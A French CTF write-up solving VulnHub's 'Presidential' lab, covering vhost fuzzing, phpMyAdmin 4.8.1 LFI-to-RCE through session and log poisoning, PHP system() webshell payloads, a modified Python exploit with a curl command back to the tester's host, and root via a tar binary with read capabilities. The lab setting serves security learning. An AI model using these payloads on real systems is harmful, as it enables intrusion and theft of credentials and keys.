# Solution du CTF Presidential de VulnHub

Campagne
--------

[Presidentialest un CTF de [Thomas Williams](https://www.bootlesshacker.com/) disponible sur VulnHub.  

Le synopsis est le suivant :  

> The Presidential Elections within the USA are just around the corner (November 2020).  
> 
> One of the political parties is concerned that the other political party is going to perform electoral fraud by hacking into the registration system, and falsifying the votes.  
> 
>   
> 
> The state of Ontario has therefore asked you (an independent penetration tester) to test the security of their server in order to alleviate any electoral fraud concerns.  
> 
> Your goal is to see if you can gain root access to the server – the state is still developing their registration website but has asked you to test their server security before the website and registration system are launched.

Premier tour
------------

```plain
Nmap scan report for 192.168.56.119
Host is up (0.00014s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.5.38)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Ontario Election Services » Vote Now!
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.5.38
2082/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 06:40:f4:e5:8c:ad:1a:e6:86:de:a5:75:d0:a2:ac:80 (RSA)
|   256 e9:e6:3a:83:8e:94:f2:98:dd:3e:70:fb:b9:a3:e3:99 (ECDSA)
|_  256 66:a8:a1:9f:db:d5:ec:4c:0a:9c:4d:53:15:6c:43:6c (ED25519)
```

J'ai lancé [Nuclei](https://nuclei.projectdiscovery.io/) sur le site qui a rapidement trouvé un fichier de backup :  

```plain
[2021-12-23 12:15:56] [php-backup-files] [http] [medium] http://192.168.56.119/config.php.bak
```

Il s'agit d'identifiants pour la base de données :  

```php
<?php

$dbUser = "votebox";
$dbPass = "casoj3FFASPsbyoRP";
$dbHost = "localhost";
$dbname = "votebox";

?>
```

Sur la page d'accueil on trouve différents noms ainsi que dans la page *about.html* trouvée via énumération.  

J'en ait fait la wordlist suivante en imaginant des logins associés :  

```plain
kelly
bowen
hugh
morgan
walter
white
sarah
jhonson
william
anderson
amanda
jepson
kbowen
hmorgan
wwhite
sjhonson
wanderson
ajepson
votenow
```

Vu que l'énumération web ne ramenait rien j'ai tenté de bruteforcer (rapidement) ces comptes sur le SSH au cas où, sans succès...  

A noter qu'à chaque fois on obtenait une erreur de ce type :  

```plain
votebox@192.168.56.119: Permission denied (publickey,gssapi-keyex,gssapi-with-mic).
```

Le login par mot de passe a sans doute été désactivé globalement.  

Comme on peut voir un domaine *votenow.local* dans le code HTML j'ai procédé à des énumérations des hôtes virtuels. Finalement avec une des wordlists quelque chose est ressorti.  

```plain
$ ffuf -w fuzzdb/discovery/dns/alexaTop1mAXFRcommonSubdomains.txt -u http://192.168.56.119/ -H "Host: FUZZ.votenow.local" -fs 11713

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.56.119/
 :: Wordlist         : FUZZ: fuzzdb/discovery/dns/alexaTop1mAXFRcommonSubdomains.txt
 :: Header           : Host: FUZZ.votenow.local
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 11713
________________________________________________

datasafe                [Status: 200, Size: 9500, Words: 439, Lines: 69]
:: Progress: [50000/50000] :: Job [1/1] :: 2023 req/sec :: Duration: [0:00:15] :: Errors: 0 ::
```

Ce *datasafe.votenow.local* nous amène sur une installation de phpMyAdmin. Les identifiants récupérés précédemment permettent de s'y connecter.  

Dans une table *users* on trouve un hash bcrypt (misère) d'un certain *admin*. Il faut bien 40 minutes pour casser le hash qui correspond au clair *Stella* (la vitesse de cassage est entre 15 et 20 hashs à la seconde chez moi).  

Notre utilisateur SQL *votebox* ne dispose pas du privilège *FILE* qui aurait pu nous permettre de poser un webshell sur la machine.  

```plain
show grants;

GRANT USAGE ON *.* TO 'votebox'@'%' IDENTIFIED BY PASSWORD '*F8DCB98DA2D0C94434F0A37BFA19CDAB5F1BC5ED'	
GRANT ALL PRIVILEGES ON `votebox`.* TO 'votebox'@'%'	
GRANT ALL PRIVILEGES ON `votebox\_%`.* TO 'votebox'@'%'	
```

Armé du pass pour *admin*, on aimerait bien en faire quelque chose mais l'authentification par mot de passe étant bloqué on ne peut pas aller plus loin...  

En fait la version du *phpMyAdmin* est la 4.8.1 qui est vulnérable à [une faille d'inclusion locale pouvant amener à de l'exécution de code](https://www.exploit-db.com/exploits/50457).  

La vulnérabilité nécessite d'être authentifié et ça tombe bien vu que c'est notre cas. L'exploitation se fait de cette façon :  

*http://datasafe.votenow.local/index.php?target=db\_sql.php%253f/../../../../../../etc/passwd*  

L'exploit pour obtenir la RCE poste une requête du type  

```plain
select 'php system($_GET[&quot;cmd&quot;]); ?';
```

sur */import.php* puis il inclut le fichier de cookie présent sur le serveur (qui est nommé d'après la valeur du cookie *phpMyAdmin* donné lors de la connexion).  

L'idée c'est que la requête SQL est stockée dans la session qui est ensuite incluse.  

On a donc une requête qui ressemble à ça :  

```plain
http://datasafe.votenow.local/index.php?target=db_sql.php%253f/../../../../../../var/lib/php/sessions/sess_bitno6d2hc3k0vp7dr05turs0o5s3c4k
```

Et qui aurait dû fonctionner sauf que ça n'a pas été le cas.  

J'ai modifié l'exploit pour qu'il tente à la place d'inclure des fichiers d'une wordlist et affiche un extrait du contenu si ça fonctionne.  

```python
session_id = cookies.get_dict()['phpMyAdmin']
with open("/opt/hdd/downloads/tools/wordlists/files/LFI-LFISuite-pathtotest.txt") as fd:
    for line in fd:
        logfile = line.strip()
        url3 = url + f"/index.php?target=db_sql.php%253f/../../../../../../../../{logfile}&cmd=curl%20http://192.168.56.1:8000/{logfile}"
        r = requests.get(url3, cookies = cookies)
        soup = BeautifulSoup(r.text, "html.parser")
        data = soup.find("div", id="page_content").get_text(strip=True)
        if not data:
            continue

        print(f"File {logfile} is readable")
        print(data[:20])
        print("")
```

J'avais des outputs de ce type :  

```plain
File /proc/self/cmdline is readable
/usr/sbin/httpd-DFO

File /proc/self/stat is readable
1877 (httpd) R 889 8

File /proc/self/status is readable
Name:   httpd
Umask:  0

File /proc/self/fd/2 is readable
[Sun Dec 26 12:12:01

File /proc/self/fd/6 is readable
192.168.56.1 - - [26

File /proc/self/fd/9 is readable
PMA_token |s:16:"(lX
```

*/proc/self/environ* n'est malheureusement pas accessible mais sur */proc/self/fd/6* on a les logs HTTP avec des entrées de ce type :  

```plain
192.168.56.1 - - [26/Dec/2021:12:52:55 +0000] "GET /index.php HTTP/1.1" 200 11414 "-" "python-requests/2.25.1"
```

Dans la logique il n'y a qu'à faire une requête avec un User-Agent spécial puis réinclure le fichier :  

```plain
curl -A '<?php system($_GET["cmd"]); ?>' http://datasafe.votenow.local/
```

C'est là où je me suis merdé et ait fermé une porte. Fuck! Il semble que le guillemet a été échappé ce qui causait une erreur de syntaxe à l'inclusion (que je pouvais ensuite voir sur la sortie d'erreur en incluant */proc/self/fd/2*).  

Dans ces cas là soit on trouve une astuce alternative soit on compte sur la rotation des logs pour corriger notre bétise (on peut attendre des heures, des jours ou éventuellement bourriner de requêtes selon la configuration de logrotate).  

Bourriner n'ayant pas fonctionné je me suis penché sur l'inclusion de */proc/self/fd/9* qui correspond vraisemblablement au fichier de session que l'exploit aurait du inclure.  

*phpMyAdmin* contient différentes fonctionnalités de personnalisation et j'ai testé différents réglages avant de croiser un paramètre qui se retrouvait effectivement dans la session.  

Finalement le titre de l'interface web est un bon candidat :  

![VulnHub Presidentials CTF phpMyAdmin title configuration](https://raw.githubusercontent.com/devl00p/blog/master/images/vulnhub/presidentials_pma_settings.png)

Le texte est bien présent :  

```plain
--- snip ---
userconfig|a:2:{s:2:"db";a:3:{s:12:"Console/Mode";s:8:"collapse";s:12:"TitleDefault";s:12:"<thisisdope>";s:14:"Server/hide_db";s:0:"";}s:2:"ts";i:1640526301;}
--- snip ---
```

Maintenant il s'agit de ne pas se rater. Je modifie cette valeur pour la ligne suivante :  

```php
dv_start<?php system($_GET[chr(99)]); ?>dv_end
```

Ce qui me permettra aussi de retrouver facilement mon output.  

Cette fois ça fonctionne bien si on passe *id; uname -a* au paramètre *c* :  

```plain
dv_startuid=48(apache) gid=48(apache) groups=48(apache)
Linux votenow.local 3.10.0-1127.13.1.el7.x86_64 #1 SMP Tue Jun 23 15:46:38 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
dv_end
```

Second tour
-----------

Premier réflexe après ces difficultés : écrire un shell.php à la racine du site :)  

LinPEAS me remonte pas mal d'exploits possibles : dirtycow, sudo Baron Samedit, RationalLove, overlayfs ainsi que ceux-ci :  

```plain

  [1] exploit_x
      CVE-2018-14665
      Source: http://www.exploit-db.com/exploits/45697
  [2] pp_key
      CVE-2016-0728
      Source: http://www.exploit-db.com/exploits/39277
  [3] timeoutpwn
      CVE-2014-0038
      Source: http://www.exploit-db.com/exploits/31346
```

Mais avant d'en arriver là j'ai remarqué une entrée étrange dans la liste des binaires avec des capabilities :  

```plain
Files with capabilities (limited to 50):
/usr/bin/newgidmap = cap_setgid+ep
/usr/bin/newuidmap = cap_setuid+ep
/usr/bin/ping = cap_net_admin,cap_net_raw+p
/usr/bin/tarS = cap_dac_read_search+ep
/usr/sbin/arping = cap_net_raw+p
/usr/sbin/clockdiff = cap_net_raw+p
/usr/sbin/suexec = cap_setgid,cap_setuid+ep
```

Ce *tarS* a un nom bizarre. Est-ce une copie de la commande *tar* ? Plus de doute sur son rôle quand on voit le propriétaire du binaire :  

```plain
-rwx------. 1 admin admin 346136 Jun 27  2020 /usr/bin/tarS
```

D'après une [page de manuel](http://manpagesfr.free.fr/man/man7/capabilities.7.html), *CAP\_DAC\_READ\_SEARCH*  

> Contourne les permissions de lecture de fichiers et celles de lecture et exécution des répertoires.

Il nous faut être *admin* pour utiliser le programme, ça tombe bien le hash cassé précédemment nous permet de nous connecter via *su*.  

On trouve deux fichiers texte une fois connecté :  

```plain
[admin@votenow ~]$ cat user.txt 
663ba6a402a57536772c6118e8181570
[admin@votenow ~]$ cat notes.txt 
Reminders:

1) Utilise new commands to backup and compress sensitive files
```

Merci j'avais pigé ! :p  

On peut donc utiliser la capability pour lire ce que l'on souhaite sur le système mais pas écrire malheureusement. On va archiver ce qui est dans le dossier de *root* :  

```bash
tarS cz /root > root.tar.gz
```

On y trouve entre autres les fichiers suivants :  

```plain
root/root-final-flag.txt
root/.ssh/
root/.ssh/id_rsa
root/.ssh/id_rsa.pub
root/.ssh/authorized_keys
```

Aucun mot de passe n'étant attaché à la clé privée on peut donc se connecter :  

```plain
[admin@votenow ~]$ ssh -p 2082 -i root/.ssh/id_rsa root@127.0.0.1
Last login: Sun Jun 28 00:42:56 2020 from 192.168.56.1
[root@votenow ~]# id
uid=0(root) gid=0(root) groups=0(root)
[root@votenow ~]# cat root-final-flag.txt 
Congratulations on getting root.

 _._     _,-'""`-._
(,-.`._,'(       |\`-/|
    `-.-' \ )-`( , o o)
          `-    \`_`"'-

This CTF was created by bootlesshacker - https://security.caerdydd.wales

Please visit my blog and provide feedback - I will be glad to hear from you.
```

Mission accomplie !](https://www.vulnhub.com/entry/presidential-1,500/)

*Published December 26 2021 at 16:51*